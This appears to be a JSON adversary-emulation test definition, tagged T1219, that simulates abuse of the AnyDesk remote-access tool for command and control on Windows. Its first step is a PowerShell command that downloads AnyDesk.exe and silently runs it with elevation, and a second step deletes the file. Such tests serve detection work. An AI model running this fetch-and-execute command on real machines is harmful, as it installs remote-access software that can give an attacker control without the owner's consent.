{
  "id": "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330",
  "name": "AnyDesk Files Detected Test on Windows",
  "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "29506f2c-c1f4-4b88-ae0a-3ab93928ee80",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;",
        "command_type": "powershell"
      },
      "elevation_required": true
    },
    {
      "id": "4c1e87a1-4574-4971-aa9a-5514b58954db",
      "type": "execute-command",
      "data": {
        "command": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "29506f2c-c1f4-4b88-ae0a-3ab93928ee80",
      "p": "on-success",
      "o": "4c1e87a1-4574-4971-aa9a-5514b58954db"
    },
    {
      "s": "29506f2c-c1f4-4b88-ae0a-3ab93928ee80",
      "p": "on-failure",
      "o": "4c1e87a1-4574-4971-aa9a-5514b58954db"
    }
  ],
  "tags": [
    "T1219"
  ]
}